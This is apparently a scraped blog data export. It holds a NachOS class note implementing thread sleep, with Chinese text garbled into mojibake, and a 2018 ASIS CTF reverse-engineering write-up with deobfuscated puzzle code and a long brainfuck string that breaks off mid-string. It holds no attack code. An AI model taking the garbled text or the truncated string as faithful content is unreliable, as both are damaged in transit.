Routines to emulate a hardware timer device.//// A hardware timer generates a CPU interrupt every X milliseconds.// This means it can be used for implementing time-slicing.// ä¸­æ–·çš„é‹ä½œæ˜¯é€™æ¨£çš„ï¼Œç™¼ç”Ÿä¸­æ–· -&gt; ä½œæ¥­ç³»çµ±æ‰¾åˆ°ä¸­æ–·å‘é‡ -&gt; åŸ·è¡Œå°æ‡‰ä¸­æ–·å¸¸å¼ï¼Œé€™è£¡æ™‚è„ˆå°æ‡‰çš„ä¸­æ–·å¸¸å¼åœ¨ NachOS è£¡é¢æ˜¯ Alarmï¼ŒAlarmä¸­æœ¬ä¾†å°±æœ‰å®šç¾© WaitUntilï¼Œæˆ‘å€‘è¦åˆ©ç”¨é€™å€‹ function ä¾†å¯¦ä½œ sleepï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡æ™‚è„ˆä¸­æ–·è§¸ç™¼ä¸­æ–·å¸¸å¼çš„æ™‚å€™æˆ‘å€‘é€²è¡Œè¨ˆæ•¸ï¼Œç•¶è¨ˆæ•¸åˆ°é”æˆ‘å€‘æŒ‡å®šçš„ sleep æ™‚é–“å¾Œï¼Œå°±æŠŠè©² Thread å†æ¬¡æ”¾å› Read Queue è£¡é¢ç­‰å¾…åŸ·è¡Œã€‚ åœ¨åŸ·è¡Œä¸­æ–·çš„æ™‚å€™æœ‰åˆ†ç‚ºä¸ŠåŠéƒ¨è·Ÿä¸‹åŠéƒ¨ï¼Œä¸ŠåŠéƒ¨æ˜¯è¼ƒç·Šæ€¥çš„éƒ¨åˆ†ï¼Œè¦é¦¬ä¸Šè™•ç†ï¼Œæ‰€ä»¥è¦åœ¨é—œä¸­æ–·çš„ç‹€æ…‹ä¸‹åŸ·è¡Œï¼ˆä¸æ¥å—å…¶ä»–ä¸­æ–·ï¼‰ï¼Œä¸‹åŠéƒ¨å‰‡æ²’é€™éº¼æ€¥ï¼Œå¯ä»¥åœ¨é–‹ä¸­æ–·çš„æƒ…æ³ä¸‹è™•ç†ã€‚ æœ¬ä¾†æˆ‘å€‘æ‡‰è©²è¦åœ¨ Scheduler çš„åœ°æ–¹å¯¦ä½œ sleepList æ‰æ˜¯æ­£ç¢ºçš„ï¼Œä¸éé€™è£¡å…ˆæ±‚å¿«é€Ÿï¼Œå¯¦ä½œä¸€å€‹å¡åœ¨ Alarm è£¡é¢çš„ sleepList å°±å¥½ã€‚ code/threads/alarm.h// alarm.h // Data structures for a software alarm clock.//// We make use of a hardware timer device, that generates// an interrupt every X time ticks (on real systems, X is// usually between 0.25 - 10 milliseconds).//// From this, we provide the ability for a thread to be// woken up after a delay; we also provide time-slicing.//// NOTE: this abstraction is not completely implemented.//// Copyright (c) 1992-1996 The Regents of the University of California.// All rights reserved. See copyright.h for copyright notice and limitation // of liability and disclaimer of warranty provisions.#ifndef ALARM_H#define ALARM_H#include &quot;copyright.h&quot;#include &quot;utility.h&quot;#include &quot;callback.h&quot;#include &quot;timer.h&quot;#include &lt;list&gt;#include &quot;thread.h&quot;class sleepList &#123; public: sleepList():_current_interrupt(0) &#123;&#125;; void PutToSleep(Thread *t, int x); bool PutToReady(); bool IsEmpty(); private: class sleepThread &#123; public: sleepThread(Thread* t, int x): sleeper(t), when(x) &#123;&#125;; Thread* sleeper; int when; &#125;; int _current_interrupt; std::list&lt;sleepThread&gt; _threadlist;&#125;;// The following class defines a software alarm clock. class Alarm : public CallBackObj &#123; public: Alarm(bool doRandomYield); // Initialize the timer, and callback // to &quot;toCall&quot; every time slice. ~Alarm() &#123; delete timer; &#125; void WaitUntil(int x); // suspend execution until time &gt; now + x private: Timer *timer; // the hardware timer device sleepList _sleepList; void CallBack(); // called when the hardware // timer generates an interrupt&#125;;#endif // ALARM_H ç„¶å¾ŒæŠŠ function å¡«å¥½ï¼Œç›¸é—œè¨»é‡‹æ”¾åœ¨ code è£¡é¢ã€‚ é€™è£¡å…¶å¯¦å¯ä»¥åšå¾—æ›´å¥½ä¸€é»ï¼Œå°±æ˜¯æ¯æ¬¡åœ¨æ’å…¥æ™‚å°±ç…§é †åºæ’å…¥ï¼Œé€™æ¨£åœ¨æª¢æŸ¥è¦ä¸è¦å–šé†’ Thread çš„æ™‚å€™ï¼Œå°±å¯ä»¥ä¸ç”¨æª¢æŸ¥åˆ°æœ€å¾Œï¼Œåªè¦ç™¼ç¾ç¾åœ¨é€™å€‹ Thread é‚„ä¸èƒ½å–šé†’ï¼Œå¾Œé¢çš„ä¹Ÿéƒ½ä¸èƒ½å–šé†’ code/threads/alarm.ccvoid Alarm::CallBack() &#123; Interrupt *interrupt = kernel-&gt;interrupt; MachineStatus status = interrupt-&gt;getStatus(); bool woken = _sleepList.PutToReady(); //å¦‚æœæ²’æœ‰ç¨‹å¼éœ€è¦è¨ˆæ•¸äº†ï¼Œå°±æŠŠæ™‚è„ˆä¸­æ–·é®è”½æ‰ if (status == IdleMode &amp;&amp; !woken &amp;&amp; _sleepList.IsEmpty()) &#123;// is it time to quit? if (!interrupt-&gt;AnyFutureInterrupts()) &#123; timer-&gt;Disable(); // turn off the timer &#125; &#125; else &#123; // there&#x27;s someone to preempt interrupt-&gt;YieldOnReturn(); &#125;&#125;void Alarm::WaitUntil(int x) &#123; //é—œä¸­æ–· IntStatus oldLevel = kernel-&gt;interrupt-&gt;SetLevel(IntOff); Thread* t = kernel-&gt;currentThread; cout &lt;&lt; &quot;Alarm::WaitUntil go sleep&quot; &lt;&lt; endl; _sleepList.PutToSleep(t, x); //é–‹ä¸­æ–· kernel-&gt;interrupt-&gt;SetLevel(oldLevel);&#125;bool sleepList::IsEmpty() &#123; return _threadlist.size() == 0;&#125;void sleepList::PutToSleep(Thread*t, int x) &#123; ASSERT(kernel-&gt;interrupt-&gt;getLevel() == IntOff); _threadlist.push_back(sleepThread(t, _current_interrupt + x)); t-&gt;Sleep(false);&#125;bool sleepList::PutToReady() &#123; bool woken = false; _current_interrupt ++; for(std::list&lt;sleepThread&gt;::iterator it = _threadlist.begin(); it != _threadlist.end(); ) &#123; if(_current_interrupt &gt;= it-&gt;when) &#123; woken = true; cout &lt;&lt; &quot;sleepList::PutToReady Thread woken&quot; &lt;&lt; endl; kernel-&gt;scheduler-&gt;ReadyToRun(it-&gt;sleeper); it = _threadlist.erase(it); &#125; else &#123; it++; &#125; &#125; return woken;&#125; æ¸¬è©¦æ’°å¯«å…©å€‹æœ‰ç”¨åˆ° sleep çš„ç¨‹å¼ï¼Œæª¢æŸ¥æ­£ç¢ºæ€§ï¼Œé€™è£¡è®“ sleep2 çš„é€±æœŸæ˜¯ sleep çš„ $\\frac{1}{10}$ï¼Œç„¶å¾Œè¦ä¿®æ”¹ Makefile æŠŠå…©éš»ç¨‹å¼åŠ å…¥ç·¨è­¯ï¼Œé‚„è¦æŠŠ coff è½‰æˆ NachOS è‡ªå·±å®šç¾©çš„ noff æ ¼å¼ã€‚ code/test/sleep.c#include &quot;syscall.h&quot;main() &#123; int i; for(i = 0; i &lt; 5; i++) &#123; Sleep(1000000); PrintInt(2222); &#125; return 0;&#125; code/test/sleep2.c#include &quot;syscall.h&quot;main() &#123; int i; for(i = 0; i &lt; 20; i++) &#123; Sleep(100000); PrintInt(10); &#125; return 0;&#125; code/test/Makefileall: halt shell matmult sort test1 test2 sleep sleep2...sleep: sleep.o start.o $(LD) $(LDFLAGS) start.o sleep.o -o sleep.coff ../bin/coff2noff sleep.coff sleepsleep2: sleep2.o start.o $(LD) $(LDFLAGS) start.o sleep2.o -o sleep2.coff ../bin/coff2noff sleep2.coff sleep2 make å¾ŒåŸ·è¡Œ ./nachos -e ../test/sleep -e ../test/sleep2 æ­£ç¢ºçš„è©±å‰å…©æ¬¡æœƒåƒé›œ 10 æ¬¡çš„ PrintInt(10) æ‰åŸ·è¡Œä¸€æ¬¡çš„ PrintInt(2222) Total threads number is 2Thread ../test/sleep is executing.Thread ../test/sleep2 is executing.Sleep Time:1000000(ms)Alarm::WaitUntil go sleepSleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokensleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepPrint integer:2222Sleep Time:1000000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokensleepList::PutToReady Thread wokenPrint integer:10return value:0Print integer:2222Sleep Time:1000000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:2222Sleep Time:1000000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:2222Sleep Time:1000000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:2222return value:0No threads ready or runnable, and no pending interrupts.Assuming the program completed.Machine halting! é­é‡çš„å›°é›£æˆ‘æ‰¾ä¸åˆ° code æ”¾åœ¨å“ªè£¡ï¼²ï¼Œæ˜¯æ²’æœ‰ document é‚„æ˜¯æ•…æ„æ²’æœ‰ documentï¼Œæˆ‘çŒœæ˜¯æ•…æ„æ²’æœ‰çš„","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://blog.terrynini.tw/tags/OS/"}]},{"title":"2018::ASIS-Quals::reverse","slug":"2018-ASIS-Quals-reverse","date":"2018-05-04T06:00:11.000Z","updated":"2024-06-20T16:46:01.064Z","comments":true,"path":"en/2018-ASIS-Quals-reverse/","permalink":"http://blog.terrynini.tw/en/2018-ASIS-Quals-reverse/","excerpt":"Another excuse, I had my wisdom tooth extracted, or I could solve them(rev) all.","text":"Another excuse, I had my wisdom tooth extracted, or I could solve them(rev) all. WarmUpObviously, itâ€™s a C program which was compacted to one line with some #define.After formatted, it looks like: #include &lt;stdint.h&gt;#define M 37#define q (2+M/M)#define v (q/q)#define ef ((v+q)/2)#define f (q-v-ef)#define k (8-ef)struct b &#123; int64_t y[13];&#125; S;int m = 1811939329, N = 1, t[1 &lt;&lt; 26] = &#123;2&#125;, a, * p, i, e = 73421233, s, c, U = 1;g(d, h) &#123; for (i = s; i &lt; 1 &lt;&lt; 25; i *= 2) d = d * 1 LL * d % m; for (p = t; p &lt; t + N; p += s) for (i = s, c = 1; i; i--) a = p[s] * (h ? c : 1 LL) % m, p[s] = (m * 1 U + * p - a) * (h ? 1 LL : c) % m, * p = (a * 1 U + * p) % m, p++, c = c * 1 LL * d % m;&#125;l() &#123; while (e /= 2) &#123; N *= 2; U = U * 1 LL * (m + 1) / 2 % m; for (s = N; s /= 2;) g(136, 0); for (p = t; p &lt; t + N; p++) * p = * p * 1 LL * * p % m * U % m; for (s = 1; s &lt; N; s *= 2) g(839354248, 1); for (a = 0, p = t; p &lt; t + N;) a += * p &lt;&lt; (e &amp; 1), * p++ = a % 10, a /= 10; &#125;&#125;z(n) &#123; int y = 3, j, c; for (j = 2; j &lt;= n;) &#123; l(); for (c = 2; c &lt;= y - 1; c++) &#123; l(); if (y % c == 0) break; &#125; if (c == y) &#123; l(); j++; &#125; y++; &#125; l(); return y - 1;&#125;main(a, pq) char * pq; &#123; int b = sizeof(S), y = b, j = M; l(); int x[M] = &#123; b - M - sizeof((short int) a), (b &gt;&gt; v) + (k &lt;&lt; v) + (v &lt;&lt; (q | ef)) + z(v + (ef &lt;&lt; v)), (z(k * ef) &lt;&lt; v) - pow(ef, f), z(((j - ef * k) | (ef &lt;&lt; k &gt;&gt; v) / k - ef &lt;&lt; v) - ef), (((y + M) &amp; b) &lt;&lt; (k / q + ef)) - z(ef + v), ((ef &lt;&lt; k) - v) &amp; y, y * v + v, (ef &lt;&lt; (q * ef - v - (k &gt;&gt; ef))) * q - v, (f &lt;&lt; q) | (ef &lt;&lt; (q * f + k)) - j + k, (z(z(z(z(z(v))))) * q) &amp; (((j / q) - (ef &lt;&lt; v)) &lt;&lt; q) | (j + (q | (ef &lt;&lt; v))), y | (q + v), (ef &lt;&lt; ef) - v + ef * (((j &gt;&gt; ef) | j) - v + ef - q + v), (z(j &amp; (b &lt;&lt; ef)) &amp; (z(v &lt;&lt; v) &lt;&lt; k)) - (q &lt;&lt; v) - q, (k &lt;&lt; q) + q, (z(y) &gt;&gt; (ef &lt;&lt; v)) + (z(k + v)) - q, (z(z(k &amp; ef | j)) &amp; b | ef | v &lt;&lt; f &lt;&lt; q &lt;&lt; v &amp; ef &gt;&gt; k | q &lt;&lt; ef &lt;&lt; v | k | q) + z(v &lt;&lt; v) + v, (ef &gt;&gt; v) * q * z(k - v) + z(ef &lt;&lt; ef &amp; q | k) + ef, z(k &lt;&lt; k) &amp; v &amp; k | y + k - v, z(f &gt;&gt; ef | k &gt;&gt; ef | v | k) * (ef &gt;&gt; v) * q, (ef &lt;&lt; k - ef &lt;&lt; v &gt;&gt; q &lt;&lt; ef * ef) - j + (ef &lt;&lt; v), z(ef * k) * z(v &lt;&lt; v) + k - v, z((z(k) &lt;&lt; z(v))) &amp; y | k | v, z(ef &lt;&lt; ef &lt;&lt; v &lt;&lt; v) / ef + z(v &lt;&lt; ef | k | (b &gt;&gt; q) &amp; y - f) - (ef &lt;&lt; q) + (k - v) - ef, k &lt;&lt; (ef + q) / z(ef) * z(q) &amp; z(k &lt;&lt; k) | v, ((z(y | j &gt;&gt; k * ef)) % ef &lt;&lt; z(v &lt;&lt; v &lt;&lt; v) &gt;&gt; q &lt;&lt; q | j) / ef + v, (j - ef &lt;&lt; ef &lt;&lt; v * z(v &gt;&gt; v &lt;&lt; v) &gt;&gt; ef) / ef % z(k &lt;&lt; j) + q, z(k - v) + k | z(ef &lt;&lt; k &gt;&gt; v &lt;&lt; f) - z(q &lt;&lt; q) * ef &gt;&gt; v, (z(ef | y &amp; j | k) % q | j + ef &lt;&lt; z(k | ef) % k &lt;&lt; q | ef | k &lt;&lt; ef &lt;&lt; q / ef | y / ef + j &gt;&gt; q) &amp; k &lt;&lt; j | ef + v, 84, z(v * ef &lt;&lt; ef &lt;&lt; q) * q % ef &lt;&lt; k | k | q - v, ((z(20) * v) | (f &gt;&gt; q) | (k &lt;&lt; k)) / ef - (ef &lt;&lt; (v * q + ef)) - (k &lt;&lt; q) + z(k) - q &#125;; while (j--) &#123; putchar(x[M - v - j]); &#125; printf(&quot; From ASIS With Love &lt;3\\n&quot;); return 0;&#125; It just do some calculate then ouput the flag, but it took lots of time.I found that function l and function g, they are basically doing nothing.I deleted the function l, g ,and local variables int m = 1811939329, N = 1, t[1 &lt;&lt; 26] = &#123;2&#125;, a, * p, i, e = 73421233, s, c, U = 1;,after compilation &amp; execution, the flag popped out immediately. Baby CThis binary was obfuscated by movfuscator, and itâ€™s my first time to solve such challenge, so that I did not realize that this was obfuscated at first timeâ€¦â€¦ Using gdb, I found that uses sigaction to register callback function for SIGSEGV, SIGILL, then the binary will try to trigger them by accessing invalid address, so the binary can jump into libc to execute strncmp to compare that wether the input[3:14] equals to m0vfu3c4t0r! or not. I used demovfuscator to deobfuscate the binary, but there were still so much mov in binary. I thought the description of challenge, This babyc needed swaddling!,means that it used movfuscator more than one time,but I was wrongâ€¦.Since the tool is still in development phase, I only used the function to generate flow chat. (You can solve this challenge without any deobfuscator, itâ€™s not so hard) Before every branch, the corresponding char would show up many times. So I got the flag. EchoPutting it into IDA, I realized that this is actually a brainfuck interpretor.And I found a flag string in binary. Also, I found the brainfuck hard coded in this binary by gdb: &gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[+]&gt;[+]&gt;[+]&